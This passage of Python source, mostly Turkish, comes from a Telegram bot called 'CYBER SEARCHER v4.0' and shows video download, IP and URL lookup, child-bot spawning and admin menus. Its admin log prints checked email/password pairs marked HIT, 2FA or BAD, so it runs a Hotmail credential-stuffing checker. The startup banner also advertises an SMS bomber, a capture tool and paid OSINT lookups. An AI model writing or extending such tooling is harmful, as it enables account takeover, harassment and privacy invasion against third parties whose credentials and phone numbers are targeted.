        "quiet": True,
        "no_warnings": True,
        "max_filesize": 50 * 1024 * 1024,
    }
    try:
        with YoutubeDL(opts) as ydl:
            info = ydl.extract_info(link, download=True)
            if "requested_downloads" in info and info["requested_downloads"]:
                path = info["requested_downloads"][0]["filepath"]
            else:
                path = ydl.prepare_filename(info)
            if not os.path.exists(path):
                base, _ = os.path.splitext(path)
                for ext in [".mp4", ".mkv", ".webm"]:
                    if os.path.exists(base + ext):
                        path = base + ext
                        break
            if not os.path.exists(path):
                return {"ok": False, "err": "İndirilen video dosyası bulunamadı."}
            size = os.path.getsize(path)
            if size > 50 * 1024 * 1024:
                os.remove(path)
                return {"ok": False, "err": f"Video boyutu ({size / (1024*1024):.1f}MB) Telegram'ın 50MB bot limitini aşıyor."}
            return {
                "ok": True,
                "path": path,
                "title": info.get("title", "Video"),
                "size": f"{size / (1024 * 1024):.1f}MB",
                "dur": info.get("duration", "?"),
                "upl": info.get("uploader", "?")
            }
    except Exception as e:
        return {"ok": False, "err": str(e)}


def _process_video(msg, bot_instance):
    uid = msg.from_user.id
    link = msg.text.strip()
    if not link.startswith(("http://", "https://")):
        bot_instance.reply_to(msg, s(uid, "invalid_link"))
        return
    sm = bot_instance.reply_to(msg, s(uid, "video_wait"))
    res = _download_video(link)
    if not res["ok"]:
        bot_instance.edit_message_text(s(uid, "video_err", err=res["err"]), msg.chat.id, sm.message_id)
        return
    cap = s(uid, "video_caption", title=res["title"][:60], size=res["size"], dur=res["dur"], upl=res["upl"])
    try:
        with open(res["path"], "rb") as f:
            bot_instance.send_video(msg.chat.id, f, caption=cap, supports_streaming=True, timeout=120)
    except Exception as e:
        bot_instance.edit_message_text(f"❌ Gönderme hatası: {e}", msg.chat.id, sm.message_id)
    finally:
        if os.path.exists(res["path"]):
            os.remove(res["path"])
        try:
            bot_instance.delete_message(msg.chat.id, sm.message_id)
        except:
            pass


def _process_addbot(msg, bot_instance):
    uid = msg.from_user.id
    token = msg.text.strip()
    if len(token) < 30:
        bot_instance.reply_to(msg, "❌ Geçersiz token formatı!")
        return
    if token == BOT_TOKEN:
        bot_instance.reply_to(msg, "❌ Ana botun token'ı eklenemez!")
        return
    with _PROC_LOCK:
        if token in _CHILD_PROCS and _CHILD_PROCS[token].poll() is None:
            bot_instance.reply_to(msg, s(uid, "multi_bot_exists"))
            return
    try:
        success = _spawn_bot(token, uid)
        if success:
            bot_instance.reply_to(msg, s(uid, "multi_bot_added", token=token[:20] + "...",
                                         owner=msg.from_user.first_name or str(uid)))
        else:
            bot_instance.reply_to(msg, "❌ Bot başlatılamadı!")
    except Exception as e:
        bot_instance.reply_to(msg, f"❌ Hata: {e}")


def _process_special_tool(msg, tool, bot_instance):
    uid = msg.from_user.id
    val = msg.text.strip()
    sm = bot_instance.reply_to(msg, s(uid, "processing"))
    if tool == "proxycheck":
        result = _proxycheck(val)
    else:
        domain = val.replace("http://", "").replace("https://", "").split("/")[0]
        result = _urlscan(domain)
    if len(result) > 4096:
        for i in range(0, len(result), 4096):
            bot_instance.send_message(msg.chat.id, f"<code>{result[i:i + 4096]}</code>")
        try:
            bot_instance.delete_message(msg.chat.id, sm.message_id)
        except:
            pass
    else:
        bot_instance.edit_message_text(f"<code>{result}</code>", msg.chat.id, sm.message_id)


def _process_generic_tool(msg, tool, bot_instance):
    uid = msg.from_user.id
    val = msg.text.strip()
    sm = bot_instance.reply_to(msg, s(uid, "processing"))
    try:
        resp = requests.get(TOOLS_API[tool] + val, timeout=15, verify=False)
        try:
            out = json.dumps(resp.json(), indent=2, ensure_ascii=False)
        except:
            out = resp.text
        bot_instance.edit_message_text(f"✅ <b>{tool.upper()}</b>\n\n<code>{out[:4000]}</code>",
                                       msg.chat.id, sm.message_id)
    except Exception as e:
        bot_instance.edit_message_text(f"❌ {e}", msg.chat.id, sm.message_id)


def _proxycheck(ip):
    try:
        url = f"https://proxycheck.io/v3/{ip}?vpn=1&asn=1&risk=1&port=1"
        r = requests.get(url, timeout=15, verify=False)
        if r.status_code != 200:
            return f"❌ HTTP {r.status_code}"
        d = r.json()
        if ip not in d:
            return "❌ IP bulunamadı."
        info = d[ip]
        loc = info.get("location", {})
        det = info.get("detections", {})
        net = info.get("network", {})
        lines = ["=" * 60, " 🛡️ PROXYCHECK.IO", "=" * 60, f" IP: {ip}", "",
                 " 📡 AĞ", f"  ASN        : {net.get('asn', '—')}",
                 f"  Sağlayıcı  : {net.get('provider', '—')}", f"  Hostname   : {net.get('hostname', '—') or '—'}", "",
                 " 📍 KONUM", f"  Ülke  : {loc.get('country_name', '—')} ({loc.get('country_code', '—')})",
                 f"  Şehir : {loc.get('city_name', '—')}", f"  TZ    : {loc.get('timezone', '—')}", "",
                 " 🔍 TESPİT",
                 f"  Proxy    : {'⚠️ Evet' if det.get('proxy') else '✅ Hayır'}",
                 f"  VPN      : {'⚠️ Evet' if det.get('vpn') else '✅ Hayır'}",
                 f"  TOR      : {'⚠️ Evet' if det.get('tor') else '✅ Hayır'}",
                 f"  Hosting  : {'⚠️ Evet' if det.get('hosting') else '✅ Hayır'}",
                 f"  Risk     : {det.get('risk', 0)}%", "",
                 "=" * 60, " @hackledin", "=" * 60]
        return "\n".join(lines)
    except Exception as e:
        return f"❌ {e}"


def _urlscan(domain):
    try:
        r = requests.get(f"https://urlscan.io/api/v1/search/?q={domain}",
                         headers={"User-Agent": "Mozilla/5.0"}, timeout=15, verify=False)
        if r.status_code != 200:
            return f"❌ HTTP {r.status_code}"
        results = r.json().get("results", [])
        if not results:
            return f"🔍 {domain} için sonuç bulunamadı."
        lines = ["=" * 60, f" 🔍 URLSCAN.IO — {domain}", "=" * 60, ""]
        for i, res in enumerate(results[:5], 1):
            task = res.get("task", {})
            page = res.get("page", {})
            lines += [f" SONUÇ #{i}", f"  URL    : {task.get('url', '—')}", f"  IP     : {page.get('ip', '—')}",
                      f"  Ülke   : {page.get('country', '—')}", f"  Başlık : {page.get('title', '—')}",
                      f"  Durum  : {page.get('status', '—')}", ""]
        lines += ["=" * 60, " @hackledin", "=" * 60]
        return "\n".join(lines)
    except Exception as e:
        return f"❌ {e}"


def _run_predunyam(chat_id, uid, bot_instance):
    try:
        r = requests.get(TOOLS_API["predunyam"], timeout=10, verify=False)
        bot_instance.send_message(chat_id, f"💎 <b>PreDunyam</b>\n\n<code>{r.text[:4000]}</code>")
    except Exception as e:
        bot_instance.send_message(chat_id, f"❌ {e}")


def _handle_admin_cb(call, action, bot_instance):
    uid = call.from_user.id
    cid = call.message.chat.id
    mid = call.message.message_id

    try:
        if action == "stats":
            tu, prem_pu, osint_pu, tc, tch = get_bot_stats()
            txt = (f"📊 <b>BOT İSTATİSTİK</b>\n{'─' * 30}\n\n"
                   f"👥 Toplam Kullanıcı: <b>{tu}</b>\n"
                   f"📧 Hotmail Premium: <b>{prem_pu or 0}</b>\n"
                   f"🌍 OSINT Premium: <b>{osint_pu or 0}</b>\n"
                   f"📦 Toplam Combo: <b>{tc or 0}</b>\n"
                   f"🔍 Toplam Sorgu: <b>{tch or 0}</b>")
            try:
                bot_instance.edit_message_text(txt, cid, mid)
            except:
                bot_instance.send_message(cid, txt)
            try:
                bot_instance.answer_callback_query(call.id)
            except:
                pass
            return

        elif action == "prem_users":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT user_id,username,first_name,premium_date,premium_osint_date FROM users WHERE is_premium=1 OR is_premium_osint=1")
            users = c.fetchall()
            conn.close()
            if not users:
                try:
                    bot_instance.answer_callback_query(call.id, "Henüz premium kullanıcı yok.")
                except:
                    pass
                return
            txt = "⭐ <b>PREMIUM KULLANICILARI</b>\n\n"
            for u_id, uname, fname, prem_date, osint_date in users:
                txt += f"👤 @{uname or fname or u_id}\n"
                if prem_date:
                    txt += f"   📧 Hotmail: {prem_date}\n"
                if osint_date:
                    txt += f"   🌍 OSINT: {osint_date}\n"
                txt += "\n"
            try:
                bot_instance.edit_message_text(txt[:4096], cid, mid)
            except:
                bot_instance.send_message(cid, txt[:4096])
            try:
                bot_instance.answer_callback_query(call.id)
            except:
                pass
            return

        elif action == "prem_log":
            logs = get_premium_logs(20)
            if not logs:
                try:
                    bot_instance.answer_callback_query(call.id, "Log yok.")
                except:
                    pass
                return
            txt = "📋 <b>PREMIUM LOG</b>\n\n"
            for u_id, uname, package, amount, date in logs:
                txt += f"👤 @{uname or u_id}  📦 {package}  💰 {amount}⭐  📅 {date}\n"
            try:
                bot_instance.edit_message_text(txt[:4096], cid, mid)
            except:
                bot_instance.send_message(cid, txt[:4096])
            try:
                bot_instance.answer_callback_query(call.id)
            except:
                pass
            return

        elif action == "give_premium":
            m = bot_instance.send_message(
                cid,
                "⭐ **Premium Ver**\n\n"
                "Kullanıcı ID veya @kullanıcıadı gir:\n"
                "Örnek: @user veya 123456789"
            )
            bot_instance.register_next_step_handler(m, lambda m: _admin_premium_select_user(m, bot_instance))
            try:
                bot_instance.answer_callback_query(call.id)
            except:
                pass
            return

        elif action.startswith("give_hotmail_"):
            parts = action.split("_")
            tid = int(parts[2])
            tuname = parts[3] if len(parts) > 3 else str(tid)
            _admin_give_premium_hotmail(call, tid, tuname, bot_instance)
            return

        elif action.startswith("give_osint_"):
            parts = action.split("_")
            tid = int(parts[2])
            tuname = parts[3] if len(parts) > 3 else str(tid)
            _admin_give_premium_osint(call, tid, tuname, bot_instance)
            return

        elif action.startswith("give_capture_"):
            parts = action.split("_")
            tid = int(parts[2])
            tuname = parts[3] if len(parts) > 3 else str(tid)
            _admin_give_premium_capture(call, tid, tuname, bot_instance)
            return

        elif action == "remove":
            m = bot_instance.send_message(
                cid,
                "👤 **Premium Kaldır**\n\n"
                "Kullanıcı ID veya @kullanıcıadı gir:"
            )
            bot_instance.register_next_step_handler(m, lambda m: _admin_remove(m, bot_instance))
            try:
                bot_instance.answer_callback_query(call.id)
            except:
                pass
            return

        elif action == "ban":
            m = bot_instance.send_message(cid, "🚫 Banlamak istediğin kullanıcıyı gir (@kullanici veya ID):")
            bot_instance.register_next_step_handler(m, lambda m: _admin_ban(m, bot_instance))
            try:
                bot_instance.answer_callback_query(call.id)
            except:
                pass
            return

        elif action == "unban":
            m = bot_instance.send_message(cid, "✅ Banını kaldırmak istediğin kullanıcıyı gir:")
            bot_instance.register_next_step_handler(m, lambda m: _admin_unban(m, bot_instance))
            try:
                bot_instance.answer_callback_query(call.id)
            except:
                pass
            return

        elif action == "banned":
            banned = get_banned_users()
            if not banned:
                bot_instance.send_message(cid, "📭 Yasaklı kullanıcı bulunamadı.")
            else:
                txt = "🚫 <b>YASAKLI KULLANICILAR</b>\n\n"
                for u_id, uname, fname, reason in banned:
                    txt += f"👤 @{uname or fname or u_id}\n   📌 Sebep: {reason}\n\n"
                bot_instance.send_message(cid, txt[:4096])
            try:
                bot_instance.answer_callback_query(call.id)
            except:
                pass
            return

        elif action == "announce":
            m = bot_instance.send_message(cid, "📢 Duyuru mesajını gir:")
            bot_instance.register_next_step_handler(m, lambda m: _admin_announce(m, bot_instance))
            try:
                bot_instance.answer_callback_query(call.id)
            except:
                pass
            return

        elif action == "listbots":
            registry = _load_registry()
            if not registry:
                bot_instance.send_message(cid, s(uid, "multi_bot_no_bots"))
            else:
                lines = [s(uid, "multi_bot_list"), "─" * 30, ""]
                for token, info in registry.items():
                    with _PROC_LOCK:
                        proc = _CHILD_PROCS.get(token)
                        status = s(uid, "multi_bot_running") if proc and proc.poll() is None else s(uid, "multi_bot_stopped")
                    owner_id = info.get("owner_id", "—")
                    pid = info.get("pid", "—")
                    added = info.get("added", "—")[:16]
                    lines.append(f"🔑 `{token}`")
                    lines.append(f"   📌 {status}  📋 PID: {pid}")
                    lines.append(f"   👤 Sahip: {owner_id}  📅 {added}")
                    lines.append("")
                lines.append("─" * 30)
                lines.append(s(uid, "multi_bot_total", count=len(registry)))
                bot_instance.send_message(cid, "\n".join(lines))
            try:
                bot_instance.answer_callback_query(call.id)
            except:
                pass
            return

        elif action == "hotmail_log":
            logs = get_hotmail_logs(30)
            if not logs:
                bot_instance.send_message(cid, "📭 Hotmail log kaydı bulunamadı.")
            else:
                txt = "📋 <b>HOTMAIL LOG</b>\n\n"
                for u_id, uname, email, password, status, detail, date in logs:
                    status_emoji = "✅" if status == "HIT" else "🔐" if status == "2FA" else "❌" if status == "BAD" else "⚠️"
                    txt += f"{status_emoji} @{uname or u_id} | {email} | {status}"
                    if detail:
                        txt += f" ({detail})"
                    txt += f" | {date[:16]}\n"
                bot_instance.send_message(cid, txt[:4096])
            try:
                bot_instance.answer_callback_query(call.id)
            except:
                pass
            return

    except Exception as e:
        print(f"[ADMIN CALLBACK ERROR] {e}")
        try:
            bot_instance.answer_callback_query(call.id, "⚠️ Bir hata oluştu!", show_alert=True)
        except:
            pass


def _admin_remove(msg, bot_instance):
    uid = msg.from_user.id
    target = msg.text.strip()

    tid, tuname = _resolve_target(target)
    if not tid:
        bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı!")
        return

    removed = []
    if is_premium(tid):
        remove_premium(tid)
        removed.append("Hotmail")
    if is_premium_osint(tid):
        remove_premium_osint(tid)
        removed.append("OSINT")

    if removed:
        bot_instance.reply_to(msg, f"✅ @{tuname or tid} {', '.join(removed)} Premium kaldırıldı!")
    else:
        bot_instance.reply_to(msg, f"ℹ️ @{tuname or tid} zaten Premium değil!")


def _admin_ban(msg, bot_instance):
    uid = msg.from_user.id
    target = msg.text.strip()

    tid, tuname = _resolve_target(target)
    if not tid:
        bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı!")
        return

    m = bot_instance.reply_to(msg, f"🚫 @{tuname or tid} banlanıyor... Ban sebebini gir:")
    bot_instance.register_next_step_handler(m, lambda m: _admin_ban_reason(m, bot_instance, tid, tuname))


def _admin_ban_reason(msg, bot_instance, tid, tuname):
    uid = msg.from_user.id
    reason = msg.text.strip() or "Kural ihlali"

    ban_user(tid, reason)
    bot_instance.reply_to(msg, f"🚫 @{tuname or tid} yasaklandı!\n📌 Sebep: {reason}")

    try:
        bot_instance.send_message(
            tid,
            f"🚫 **YASAKLANDINIZ!**\n\n"
            f"📌 Sebep: {reason}\n\n"
            f"📞 İtiraz için: @hackledin"
        )
    except:
        pass


def _admin_unban(msg, bot_instance):
    uid = msg.from_user.id
    target = msg.text.strip()

    tid, tuname = _resolve_target(target)
    if not tid:
        bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı!")
        return

    unban_user(tid)
    bot_instance.reply_to(msg, f"✅ @{tuname or tid} banı kaldırıldı!")


def _admin_announce(msg, bot_instance):
    uid = msg.from_user.id
    announcement = msg.text.strip()
    if not announcement:
        bot_instance.reply_to(msg, "❌ Kullanım: /duyuru MESAJ")
        return
    users = get_all_users()
    if not users:
        bot_instance.reply_to(msg, "❌ Gönderilecek kullanıcı bulunamadı.")
        return
    sent = 0
    failed = 0
    for user_id, username, first_name, banned in users:
        if banned:
            continue
        try:
            txt = (f"📢 **DUYURU**\n\n{announcement}\n\n"
                   f"📅 {datetime.now().strftime('%d.%m.%Y %H:%M')}")
            bot_instance.send_message(user_id, txt)
            sent += 1
            time.sleep(0.1)
        except:
            failed += 1
    bot_instance.reply_to(
        msg,
        f"✅ Duyuru gönderildi!\n\n✅ Başarılı: {sent}\n❌ Başarısız: {failed}\n"
        f"👥 Toplam: {sent + failed}"
    )


# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    child_mode = False
    child_token = None
    argv = sys.argv[1:]
    for i, arg in enumerate(argv):
        if arg == "--bot" and i + 1 < len(argv):
            child_mode = True
            child_token = argv[i + 1]

    if child_mode and child_token:
        print(f"[CHILD] Starting bot with token: {child_token[:10]}...")
        child_bot = telebot.TeleBot(child_token, parse_mode="HTML")
        register_handlers(child_bot)
        print(f"[CHILD] Bot {child_token[:10]}... ready!")
        try:
            child_bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"[CHILD] Polling error: {e}")
        sys.exit(0)

    main_bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
    register_handlers(main_bot)

    print("[MAIN] Starting saved bots...")
    start_saved_bots()

    print("""
╔══════════════════════════════════════════════════════╗
║       CYBER SEARCHER v4.0 — PRODUCTION               ║
║         Developer: @hackledin                        ║
╠══════════════════════════════════════════════════════╣
║  ✅ Premium (400 Yıldız) - Sınırsız                  ║
║  ✅ OSINT Premium (200 Yıldız) - 30+ Sorgu           ║
║  ✅ SMS Bomber (41+ Servis)                          ║
║  ✅ Hotmail Checker (Free 3000 / Premium Sınırsız)   ║
║  ✅ Hotmail v4.0 (OAuth2, Proxy, 2FA, Captcha)       ║
║  ✅ Capture Tool (Free 3 / Premium Sınırsız)         ║
║  ✅ EXIF Metadata Analizi                            ║
║  ✅ Müzik İndirici (MP3 - 192 kbps)                  ║
║  ✅ Video İndirici                                   ║
║  ✅ Türkçe / English / العربية                        ║
║  ✅ Auto-restart on crash                            ║
╚══════════════════════════════════════════════════════╝
    """)

    while True:
        try:
            main_bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"[HATA] {e}")
            time.sleep(5)
